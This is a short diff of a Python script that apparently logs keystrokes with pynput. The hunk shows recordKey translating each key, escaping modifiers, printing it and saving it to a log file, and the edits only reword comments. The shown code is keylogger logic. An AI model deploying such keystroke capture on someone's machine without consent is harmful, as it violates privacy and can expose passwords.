@@ -33,23 +33,22 @@ def escapeKeys(key):
     if key == Key.space or key == Key.tab or key == Key.enter:
         return ' '
     elif key in [Key.ctrl_l, Key.ctrl_r, Key.shift, Key.shift_r, Key.alt_gr, Key.caps_lock, Key.esc]:
-        # elif key == Key.ctrl_l or key == Key.shift or key == Key.alt_gr or key == Key.caps_lock or key == Key.esc:
         return ''
     else:
         return key
 
 
 def recordKey(key):
-    # We translate the Keys
+    # Translate the Keys
     key = translateKey(key)
 
-    # We escape some of the keys to simplify the parsing
+    # Escape some of the keys to simplify the parsing
     key = escapeKeys(key)
 
-    # We print the keys
+    # Print the keys
     printDataConsole(key)
 
-    # We write the keys in the log
+    # Write the keys in the log
     saveInFile(key)
 
 
